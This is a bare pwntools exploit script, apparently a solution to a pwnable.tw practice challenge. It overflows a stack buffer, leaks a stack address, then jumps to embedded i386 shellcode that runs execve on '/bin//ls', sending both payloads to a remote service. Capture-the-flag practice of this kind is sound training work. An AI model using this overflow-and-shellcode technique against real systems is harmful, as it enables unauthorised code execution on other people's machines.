# https://pwnable.tw/challenge/#1
from pwn import *
context(arch = 'i386',os='linux')
context.log_level='debug'
shellcode = "\x31\xc0\x50\x68\x00\x00\x00\x00\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
conn=remote('l.ssfly.club',9999)
conn.recvuntil(':')
addr1=p32(0x8048087)
pay='a'*20+addr1
conn.send(pay)
addr2=u32(conn.recv(4))
print 'stack addr:',hex(addr2)

pay='a'*20+p32(addr2+20)+shellcode
conn.send(pay)
conn.interactive()